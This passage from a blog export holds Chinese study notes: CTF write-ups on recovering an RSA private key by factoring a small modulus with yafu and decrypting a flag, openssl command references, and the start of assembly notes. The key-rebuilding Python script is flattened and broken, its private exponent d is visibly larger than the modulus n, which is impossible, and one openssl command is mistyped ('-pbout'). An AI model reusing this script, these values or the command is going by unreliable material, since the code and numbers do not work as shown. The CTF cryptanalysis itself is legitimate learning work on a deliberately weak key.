never stop to build a better world。]]></content>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Crypto：RSA2解题总结（二）]]></title>
    <url>%2F2019%2F04%2F10%2F2019.04.10%EF%BC%8833%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为昨天没有做出来RSA2，今天又重点的做了一下这道题，花了整整一天时间。今天更新一下有关这道题目的内容。 一、前期准备 openssl 的功能 RSA算法的原理 大素数分解工具：yafu-x64.exe 求模反元素工具：RSA-Tool 二、思考过程 昨天已经推导到要想求私钥，必须先要知道模数n，以及分解的两个质数 p、q思路：利用yafu工具把 n 分解成p、q => 用RSA-Tool得到 d => 合成私钥① 第一步分解质数比较容易，直接用yafu进行分解即可；② 第二布也是一样，不用求解φ(n)，直接得到 模反元素 d；③ 这道题最难的就是在于第三步：如何将（n，d）合成私钥.pem文件； 三、解题过程1.计算出 n打开公钥，找到 n （Modulus）并且用python转化位十进制； 2. 分解 n ，得到 p、q通过 yafu工具对 n 进行分解，得到p、q 3. 算出模反元素 d用RSA-Tool工具，同归计算出 d 4. 用python脚本封装成私钥（.pem文件）1234567891011import mathimport sysfrom Crypto.PublicKey import RSA RSAkey = RSA.generate(1024) RSAkey.n = 87924348264132406875276140514499937145050893665602592992418171647042491658461 RSAkey.p = 275127860351348928173285174381581152299RSAkey.q = 319576316814478949870590164193048041239RSAkey.e = 65537RSAkey.d = 93076836824908620642628594590464850812511038475673825979968428923835223225430811644363358529 private = open(&apos;private.pem&apos;,&apos;w&apos;)private.write(RSAkey.exportKey()) 5.分析得出的私钥 ① openssl rsa -in rsa_private_key.pem -out rsa_private_key.txt -text得到私钥的内容② openssl rsa -in rsa_private_key.pem -pbout -out rsa_public_key.pem从私钥中提出公钥；③ openssl rsa -in rsa_public_key.pem -out rsa_public_key.txt -text得到公钥（推导）的内容，将该内容与题目给的公钥进行比较，两者内容一样； 6. 对加密文件进行解密这里需要补充一个知识点：python 生成的私钥是无填充模式的，所以在用opensll 解密时需要设置一下“无填充模式”[-raw]：openssl rsautl -in flag.encrypt -inkey private.pem -out flag.txt -decrypt -raw 四、学习感悟今天花了很长的时间在这道题目上，遇到了很多问题，大部分问题都得到解决了，但是仍有一些问题没有得到解决，所以在这方面的学习上，仍然有很多不足之处，我明天重点总结一下今天遇到的问题，以及解决方法，还有重点学一下私钥的填充模式和RSA的详细知识。 五、每日一句 你若不想做，会找一个或无数个借口；你若想做，会想一个或无数个办法。]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Crypto：RSA2解题总结（一）]]></title>
    <url>%2F2019%2F04%2F09%2F2019.04.09%EF%BC%8832%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在学习了有关openssl的内容后，今天开始了“RSA”的解题，但是今天没有解出来，主要说一下我的整个解题的思路和步骤。 一、前期准备 openssl 的功能 RSA算法的原理 Linux Kali系统的安装 前两个知识点在前面都详细的介绍过了，这篇文章就不一一叙述了。 二、思考过程1. 题目给了pubkey.pem和flag.encrypt文件，该加密文件是不是由私钥加密，公钥解密呢？&nbsp;&nbsp;&nbsp;&nbsp;在做“What‘s RSA？”这道题时，就分析过两种可能：公钥加密—&gt;私钥解密；私钥加密—&gt;公钥解密，因为在那道题目中，给出的是一个私钥（rsa_private_key.pem），所以当时直接用的私钥进行解密，得到明文的。这道题会不会和上道题目一样，直接用公钥（pubkey.pem）就可以对密文进行解密呢？2. 如果不是由私钥加密的，那么用公钥如何对该加密文件进行解密呢？&nbsp;&nbsp;&nbsp;&nbsp;通过学习RSA算法原理，可以知道：公钥可以从私钥中得出，那么通过公钥能否得出私钥呢？（这是本题的关键所在，也是我遇到的一个难点） 三、解题过程1.电脑的准备工作&nbsp;&nbsp;&nbsp;&nbsp;因为换了一台电脑，所以配置的环境和软件都要重新安装，遇到了很多问题，在这些问题上花了很多时间，希望在这里总结一下解决这些问题的方法吧。&nbsp;&nbsp;&nbsp;&nbsp;① hexo博客的迁移注意问题&nbsp;&nbsp;&nbsp;&nbsp;首先要对电脑重新配置环境，在安装了Hexo并创建了新的博客文件后，直接把以前的文件全部粘贴替换，这时候还不能更新博客，最重的是把.ssh目录下的密钥拷到新电脑的.ssh文件下（ssh-keygon 查找.ssh 的位置），这时候就可以更新博客内容了。&nbsp;&nbsp;&nbsp;&nbsp;② Kali系统安装问题解决办法&nbsp;&nbsp;&nbsp;&nbsp;安装Kali可谓一波三折，最终在今天下午成功的安装并配置好。要注重说一下要注意的问题： 问题一：在安装时一直遇到光盘读取错误解决办法：在Kali官网下载最新的镜像（保证镜像文件的完整性），在安装时选择Debian x 9.0 64位 问题二：DHCP配置错误解决办法：选择桥接模式，并设置虚拟机的网络，在桥接模式选择自己的无线网卡；在安装好kali系统后，用cat /etc/network/interfaces，查看正常应该是下图的内容：注：红圈中的内容就是我补充的再执行/etc/init.d/networking restart，重启网络，使刚才的配置生效，ifconfig查看网络设置： 说明网络配置成功。 问题三：换源问题解决办法：一开始用的中科大和阿里的云，但是都失败了，最终用的清华的源（建议用清华的源） 2.用公钥对密文进行解密 使用openssl的选项对文件进行解密：openssl rsautl -in pubkey.pem -pubin -inkey flag.encrypt -decrypt,但是输出为：A private key is needed for this operation说明该文件是由公钥加密，需要私钥解密。 3.尝试用私钥对文件进行解密 1.先将公钥以文件格式输出：openssl rsa -in pubkey.pem -pubin -out pubkey.txt -text，查看文件内容：这里可以得到Modulus、Exponent和Public Key的数值。2.分析如何从公钥得到私钥首先要分析RSA原理： **公钥和密钥的生成** ① 选择两个大的质数p、q，且这两个质数互不相等； ② 计算模 n = p * q，**n 的二进制的位数就是密钥的长度**； ③ 根据欧拉函数φ(n) = (p-1) * (q-1) ④ 在1 和 φ(n)中间随机选择一个整数 e，e与φ(n）互为质数 ⑤ 计算e对于φ(n)的模反元素d：e * d ≡ 1 (mod φ(n)) 等价于 e * d - 1 = k * φ(n)， &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;已知φ(n)、e，那么通过"扩展欧几里得算法"得出d 和 k' ⑥ 得到公钥和私钥 **（n，e）=> 公钥** **（n，d）=> 私钥** 从公钥推导私钥的思想① 要想得到私钥，必须知道两个参数：n 和 d；② n在公钥中已知，那么关键在于得出d（模反元素）；③ 根据RSA算法的过程，看出 d 是由 e(从公钥中可知) 和 φ(n)以及”扩展欧几里得算法”得到的；④ φ(n) 是由p 和 q得到的，所以要知道这两个数是关键；⑤ 计算 p 和 q 要知道 分解的模 n，而模 n 在公钥中就能得到，所以最关键的是如何对 n 进行因数分解，再分解过程中有多少可能？ 4.现在的问题 现在的最主要问题是，已经得到了公钥的内容，但是文件格式还是没有看懂，所以还没有找到公钥中的 n 和 e；另一个问题是对于欧拉函数和扩展欧几里得算法不是很熟悉，明天就这两个问题继续学习。 四、学习感悟这两天虽然学到了很多东西，但是做题速度慢了很多，想了想还是效率不是很高，在做题时不能全身心的投入，以后要慢慢的改这个坏习惯。 五、每日一句失败是什么？没有什么，只是更走近成功一步；成功是什么？就是走过了所有通向失败的路，只剩下一条路，那就是成功的路。]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[openssl学习笔记（二）]]></title>
    <url>%2F2019%2F04%2F08%2F2019.04.08%EF%BC%8831%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;昨天总结了一下openssl的一些选项的功能，今天还是重点的来总结一下其他的选项：openssl speed/rand/passwd/dgst/rsautl 一、openssl speed ① 功能说明：测试加密算法的性能② 支持的算法：openssl speed [md2] [mdc2] [md5] [hmac] [sha1] [rmd160] [idea-cbc] [rc2-cbc] [rc5-cbc] [bf-cbc] [des-cbc] [des-ede3] [rc4] [rsa512] [rsa1024] [rsa2048] [rsa4096] [dsa512] [dsa1024] [dsa2048] [idea] [rc2] [des] [rsa] [blowfish]③ 说明：dsa算法只支持签名不支持加密，而rsa支持加密也支持签名 二、openssl rand① 功能说明：生成随机数② 选项格式：openssl rand [-out file] [-rand file(s)] [-base64] [-hex] num -out ：指定随机数输出文件，否则输出到标准输出； -rand file：指定随机数种子文件。种子文件中的字符越随机，openssl rand生成随机数的速度越快，随机度越高； -base64 ：指定生成的随机数的编码格式为base64； -hex ：指定生成的随机数的编码格式为hex； num ：指定随机数的长度，必须指定； ③ 示例： 使用base64编码：openssl rand -base64 30 使用hex编码：openssl rand -hex 30 使用种子文件：openssl rand -hex -rand private.pem 30 不指定编码，输出的是二进制（乱码）：openssl rand -rand private.pem 30 不使用编码：openssl rand 30 三、openssl passwd① 功能说明：用于生成加密的密码② 选项格式：openssl passwd [-crypt] [-1] [-apr1] [-salt string] [-in file] [-stdin] [-quiet] {password} -crypt：UNIX标准加密算法，此为默认算法。如果加盐(-salt)算密码，只取盐的前2位，2位后面的所有字符都忽略； -1(数字)：基于MD5的算法代号； -apr1(数字)：apache中使用的备选md5算法代号，不能和”-1”选项一起使用，因为apr1本身就默认了md5。htpasswd工具生成的身份验证密码就是此方法 -salt：加密时加点盐，可以增加算法的复杂度。但加了盐会有副作用：盐相同，密码也相同，则加密的结果将一样； -in file：从文件中读取要计算的密码列表； -stdin：从标准输入中获取要输入的密码； -quiet：生成密码过程中不输出任何信息 四、openssl dgst① 功能说明：该伪命令是单向加密工具，用于生成文件的摘要信息，也可以进行数字签名，及验证数字签名。② 选项格式：openssl dgst [-md5|-sha1|…] [-hex | -binary] [-out filename] [-sign filename] [-passin arg] [-verify filename] [-prverify filename] [-signature filename] [file…] file…：指定待（数字）签名的文件； -hex：以hex格式输出摘要信息。如果不以-hex显示，签名或验证签名时很可能乱码； -binary：以二进制格式输出摘要信息，或以二进制格式进行数字签名。这是默认格式； -out filename：指定输出文件，若不指定则输出到标准输出； -sign filename：使用私钥filename对file数字签名。签名时绝对不能加-hex等格式的选项，否则验证签名失败； -signature filename ：指定待验证的签名文件(验证数字签名时使用)； -verify filename：使用公钥filename验证数字签名(验证数字签名时使用)； -prverify filename：使用私钥filename验证数字签名(验证数字签名时使用)； -passin arg：传递解密密码。若验证签名时使用的公钥或私钥文件是被加密过的，则需要传递密码来解密； 支持的单向加密算法（信息摘要算法）：-md5 | -md4 | -ripemd160 | -sha | -sha1 | -sha224 | -sha256 | -sha384 | -sha512 | -whirlpool注：openssl dgst “-md5” = openssl “md5” ③ 示例： 随机生成一段摘要信息（即单向加密）echo "123456" | openssl md5 对/tmp/my.txt文件生成MD5摘要信息openssl dgst -md5 /tmp/my.txt openssl md5 /tmp/my.txt 生成一个私钥，然后使用该私钥对/tmp/a.txt文件签名。如果不使用-hex选项，否则默认输出格式为二进制会乱码openssl genrsa -out private.pem openssl dgst -md5 -hex -sign private.pem /tmp/a.txt #### 五、openssl rsautl ① **功能说明：**rsautl是rsa的工具，相当于rsa、dgst的部分功能集合，可用于生成数字签名、验证数字签名、加密和解密文件 ② **选项格式：** penssl rsautl [-in file] [-out file] [-inkey file] [-pubin] [-certin] [-passin arg] [-sign] [-verify] [-encrypt] [-decrypt] [-hexdump] -in file：指定输入文件； -out file：指定输出文件； -inkey file：指定密钥输入文件，默认是私钥文件，指定了”-pubin”则表示为公钥文件，使用”-certin”则表示为包含公钥的证书文件； -pubin：指定”-inkey file”的file是公钥文件； -certin：使用该选项时，表示”-inkey file”的file是包含公钥的证书文件； -passin arg：传递解密密码。若验证签名时实用的公钥或私钥文件是被加密过的，则需要传递密码来解密； -sign：使用私钥签名，并输出签名结果，注意，该选项需要提供RSA私钥文件； -verify：使用公钥验证签名文件； -encrypt：使用公钥加密文件； -decrypt：使用私钥解密文件； -hexdump：以hex方式输出； ③ rsautl 和 rsa、dgst的区别： 首先，它的前提是已经有非对称密钥，所有的命令操作都用到公钥或私钥来处理； 再者，该命令使用-in选项来指定输入文件，而不像dgst一样可以把输入文件放在命令的结尾； 最后，该命令使用的密钥文件、签名文件、证书文件都通过-inkey选项指定，再通过各功能的选项搭配来实现对应的功能。注意rsautl和pkeyutl的缺陷是默认只能对短小的文件进行操作#学习感悟这两天有关openssl的学习主要是以总结点，系统的将这些知识点放在一起学习，为以后的深度学习做好铺垫。#每日一句失败是什么？没有什么，只是更走近成功一步；成功是什么？就是走过了所有通向失败的路，只剩下一条路，那就是成功的路。]]></content>
      <tags>
        <tag>RSA</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[openssl学习笔记（一）]]></title>
    <url>%2F2019%2F04%2F07%2F2019.04.07%EF%BC%8830%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前天做了RSA的题目，发现openssl发挥着重要的作用，但是我只知道零星一点知识，今天我就系统的总结一下吧。 1.openssl 命令 openssl命令的格式：openssl command command-options argscommand部分有很多种命令，这些命令需要依赖于openssl命令才能执行，所以称为伪命令（pseudo-command）。 支持的标准命令，即伪命令（经常使用的）ca&nbsp;&nbsp;&nbsp;&nbsp;crl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dgst[1]&nbsp;&nbsp;&nbsp;&nbsp;dh&nbsp;&nbsp;&nbsp;&nbsp;dhparam&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enc[2]&nbsp;&nbsp;&nbsp;&nbsp;genpkey&nbsp;&nbsp;&nbsp;&nbsp;genrsa&nbsp;&nbsp;&nbsp;&nbsp; passwd&nbsp;&nbsp;&nbsp;&nbsp;pkey&nbsp;&nbsp;&nbsp;&nbsp;pkeyutl&nbsp;&nbsp;&nbsp;&nbsp;rand&nbsp;&nbsp;&nbsp;&nbsp;req&nbsp;&nbsp;&nbsp;&nbsp;rsa&nbsp;&nbsp;&nbsp;&nbsp;rsautl&nbsp;&nbsp;&nbsp;&nbsp;speed&nbsp;&nbsp;&nbsp;&nbsp;x509[1] 指定”dgst”命令时即单向加密支持的最常用的算法：md5[2] 指定对称加密”enc”时支持的对称加密最常用的算法：base64 各伪命令的选项”-passin”和”-passout”可能使用到的密码传递格式。“-passin”指的是传递解密时的密码， “-passout”指的是传递加密输出文件时的密码。如果不给定密码格式，将提示从终端输入。 格式一：pass:password：password表示传递的明文密码 格式二：env:var：从环境变量var获取密码值 格式三：file:filename：filename文件中的第一行为要传递的密码。若filename同时传递给”-passin”和”-passout”选项，则filename的第一行为”-passin”的值，第二行为”-passout”的值； 格式四：stdin：从标准输入中获取要传递的密码 例如，要加密某个密钥文件，使得每次使用该密钥文件都需要输入密码，则使用”-passout”指定加密密码，当使用被加密的密钥文件时需要解密，使用”-passin”传递解密密码。 二、openssl genrsa：生成rsa私钥genrsa命令是用于生成RSA私钥，但不会生成公钥，因为公钥提取自私钥。如果需要查看公钥或生成公钥，可以使用openssl rsa命令。genrsa 的用法：openssl genrsa [-out filename] [-passout arg] [-des] [-des3] [-idea] [numbits]参数说明： [-out filename]：将生成的私钥保存至filename文件，若未指定输出文件，则为标准输出。 [numbits]：指定要生成的私钥的长度，默认为1024。必须为命令行的最后一项参数。 [-des]/[-des3]/[-idea]：指定加密私钥文件用的算法，这样每次使用私钥文件都将输入密码，太麻烦所以很少使用。 [-passout args] ：加密私钥文件时，传递密码的格式，如果要加密私钥文件时未指定该项，则提示输入密码。传递密码的args的格式详情点击这里 示例： 生成512位的rsa私钥，输出到屏幕\# openssl genrsa 512 numbits：512 生成512位的rsa私钥，输出到指定的文件genrsa.txt\# openssl genrsa -out genrsa.txt 512 -out filename：-out genrsa.txt numbits：512 加密私钥文件，加密的密码为000000\# openssl genrsa -out genrsa.txt **-des3** &nbsp;-passout pass:000000 512 -out filname：-out genrsa.txt -des3：这里使用了-des3算法对私钥文件加密，如果不使用-passout选项指定密码，会进入交互式，提示输入密码 -passout args：加密密码为000000 numbits：512 注：通常使用的选项是”-out”和”numbits”选项，分别是输出的文件名称和私钥的长度 三、openssl rsa/pkey：查看私钥；从私钥中提取公钥、查看公钥 命令行功能介绍： openssl rsa：RSA对称密钥的处理工具，具有输入和输出私钥或公钥的作用； openssl pkey ：通用非对称密钥处理工具，从私钥中提取出公钥，将文件中私钥或公钥的某部分内容输出到stdout 命令行用法① rsa 命令格式：openssl rsa [-in filename] [-passin arg] [-passout arg] [-out filename] [-des|-des3|-idea] [-text] [-noout] [-pubin] [-pubout] [-check] -in filename：指定密钥输入文件。默认读取的是私钥，若指定”-pubin”选项将表示读取公钥。将从该文件读取密钥，不指定时将从stdin读取； -passin arg：传递解密密钥文件的密码。密码格式详情见这里； -passout arg：指定加密输出文件的密码； -out filename：① 默认情况下，使用openssl rsa将文件中公钥或私钥读取出来显示到stdout，使用该选项将读取的内容输出到指定的文件中；② 读取的是私钥输出的是私钥或公钥（若使用-putout选项从私钥中提取公钥），读取的是公钥输出的一定是公钥；③ 若不指定该选项，默认输出到stdout； -des|-des3|-idea：加密输出文件，使得每次读取输出文件时都需要提供密码； -text：转换输入和输出的密钥文件格式为纯文本格式； -noout：控制不输出任何密钥信息； -pubin：① 读取公钥内容，即从”-in filename”的filename中读取公钥，所以filename必须为公钥文件；② 不指定该选项时，默认是从filename中读取私钥。公钥文件可以通过文件中的公钥标识符；③ “——-BEGIN PUBLIC KEY——-“和”——-END PUBLIC KEY——-“来辨别； -pubout：① 从私钥中提取公钥，即从”-in filename”指定的私钥中提取公钥并输出，此时-in filename中的filename必须是私钥文件；② 当设置了”-pubin”时，默认也设置了”-pubout”；③ 私钥文件可以通过文件中的私钥标识符”——-BEGIN PRIVATE KEY——-“和”——-END PRIVATE KEY——-“来辨别。 -check：检查RSA密钥是否完整未被修改过，只能检测私钥，因为公钥来源于私钥。因此选项”-in filename”的filename文件只能是私钥文件； ② pkey 命令格式： openssl pkey [-in filename] [-passin arg] [-passout arg] [-out filename] [-cipher] [-text] [-noout] [-pubin] [-pubout] -cipher：等价于openssl rsa的”-des|-des3|-idea”，例如”-cipher des3”； 其他选项和rsa命令行的格式用法一样； 示例：① 创建一个rsa私钥文件genrsa.pri，然后从中提取rsa公钥到rsa.pub文件中： openssl genrsa -out private.pem 1024 &nbsp; &nbsp;#生成不加密的私钥 cat private.pem &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;#查看私钥内容 openssl rsa -in private.pem &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #读取私钥的内容 openssl rsa -in private.pem -text&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#以纯文本格式输出私钥内容 openssl rsa -in private.pem -text -noout &nbsp;#不输出私钥内容 openssl rsa -in private.pem -des3 -passout pass:123456 -out private_des.pem&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#将生成私钥加密 openssl rsa -in private_des.pem -passin pass:000000&nbsp;#读取加密的私钥 ② 从私钥中提取公钥 openssl rsa -in private.pem -pubout -out public.pem #私钥中提取公钥 openssl rsa -pubin -in public.pem -text #以文本格式输出公钥内容 openssl rsa -pubin -in public.pem -text -noout #不输出公钥内容 ③ 移除私钥文件或公钥文件的密码。只需直接输出到新文件即可openssl rsa -in private_des.pem -passin pass:00000 ④ check检测私钥文件的一致性，查看私钥文件被修改过openssl rsa -in private.pem -check 注：openssl rsa的常用选项就只有“-in filename”、”-out filename”、”-pubout” 四、学习感悟今天系统的又学习了一下openssl的命令行，感觉这对以后RSA算法的学习有了很大的帮助，不着急立马就学会，而是要慢慢积累这些知识点，每总结一个都要弄懂，打好学习的基础 五、每日一句一个人的成功不取决于他的智慧，而是毅力。]]></content>
      <tags>
        <tag>RSA</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Crypto：What's RSA？解题总结（2）]]></title>
    <url>%2F2019%2F04%2F05%2F2019.04.05%EF%BC%8829%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天开始做密码方面的题目，在2月28日的时候，我曾尝试过RSA的题目，但是因为没有深度去思考，就是总结了一下有关原理，当时并没有把这一道题做出来。今天我认真的分析了一下有关这道题的内容，并对上次的博客的内容做了修改和完善，也解出了这道题有了新的收获。 一、前期准备 openssl 命令 非对称加密体制 RSA加解密原理 二、思考过程 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我从题目中得到两个文件：flag.encrypt 和 rsa_private_key.pem，这两个文件分别是加密后的密文和密钥。 在这里首先要说的是加密体制分为：对称加密体制和非对称加密体制。两者的区别是什么呢？ 还要思考一个问题：题目中的加密文件是用的私钥加密还是公钥加密的？因为题中给出了私钥（rsa_private_key.pem），那么先尝试第一种可能：公钥加密—&gt;私钥解密；那么已知密文和密钥如何推算出明文： 若方案行不通则尝试第二种可能：私钥加密—&gt;公钥解密， 那么如何从私钥得知公钥呢？带着这些问题，我进行了资料查阅。 三、 知识储备 ① 对称加密体制和非对称加密体制的区别：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对称加密体制&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非对称加密体制 加密密钥：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;加密和解密密钥相同&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用公钥和私钥 加密算法：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DES、IDEA和AES&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RSA算法、DSA（数字签名） 加/解密方法：密钥既可加密也可解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;私钥加密—&gt;公钥解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;公钥加密—&gt;私钥解密 ② 密文和私钥如何得到明文/私钥如何推出公钥：openssl命令详解 四、解题过程第一种可能：密文是由公钥加密而得的，那么只要用私钥进行解密，即可得明文。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 打开Linux Kali虚拟机，在目标目录下打开openssl命令行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 输入opessl 命令行：openssl rsautl -decrypt -inkey rsa_private_key.pem -in flag.encrypt -out flag.txt。用私钥来解开密文，得到明文flag.txt；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里已经得出flag，说明对方是用公钥对明文加密的，那么第二种可能就排除了，但是在第二种可能中仍有值得思考的地方：如何从私钥得到公钥？第二种可能：这种可能已经被排除，那么就总结一下从私钥得到公钥的命令行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem #得到公钥&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② openssl rsa -pubin -in public.pem -text #以文本格式输出公钥内容 五、每日一句穷则思变，差则思勤！没有比人更高的山没有比脚更长的路。]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《汇编语言程序设计》学习笔记（七）]]></title>
    <url>%2F2019%2F04%2F04%2F2019.04.04%EF%BC%8828%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天继续学习的是《汇编语言程序设计》，来总结一下今天学的主要内容： 汇编程序员眼中的系统结构 第一条汇编指令 ▎一、汇编程序员眼中的系统结构 指令寄存器（PC）：▷ 下一条指令的地址；▷ EIP（x86-32）或RIP（x86-64） 寄存器与寄存器堆（Registers）：在处理器内部的以名字来访问的快速存储单元 条件码（Condition Codes）：▷ 用于存储最近执行指令的结果状态信息▷ 用于条件指令的判断执行 存储器（Memory）：▷ 以字节编码的连续存储空间▷ 存放程序代码、数据、运行栈以及操作系统数据 1.如何从C代码生成汇编代码？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C 代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对应的x86-32汇编int sum(int x,int y)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sum:{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pushl&nbsp;&nbsp;&nbsp;&nbsp;%ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int t = x+y;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;%esp, %ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 